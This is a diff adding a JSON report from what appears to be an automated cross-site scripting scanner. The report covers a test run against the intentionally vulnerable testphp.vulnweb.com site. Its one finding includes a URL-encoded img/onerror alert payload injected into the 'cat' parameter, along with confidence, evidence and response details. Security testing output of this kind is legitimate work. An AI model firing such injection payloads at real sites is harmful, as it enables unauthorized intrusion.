@@ -1,0 +1,26 @@
+{
+  "generated_at": 1761584204,
+  "findings": [
+    {
+      "timestamp": 1761583926,
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS_MARKER_1761583922_3149%22%29%3E",
+      "marker": "XSS_MARKER_1761583922_3149",
+      "param": "cat",
+      "confidence": 90,
+      "evidence": {
+        "type": "dom_reflection",
+        "screenshot": "./reports/screenshots\\xss_1761583926.png"
+      },
+      "meta": {
+        "type": "GET",
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+        "param": "cat",
+        "params": {
+          "cat": "2"
+        },
+        "tested_url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS_MARKER_1761583922_3149%22%29%3E",
+        "response_text": "\nWarning: mysql_connect(): Connection refused in /hj/var/www/database_connect.php on line 2\nWebsite is out of order. Please visit back later. Thank you for understanding."
+      }
+    }
+  ]
+}
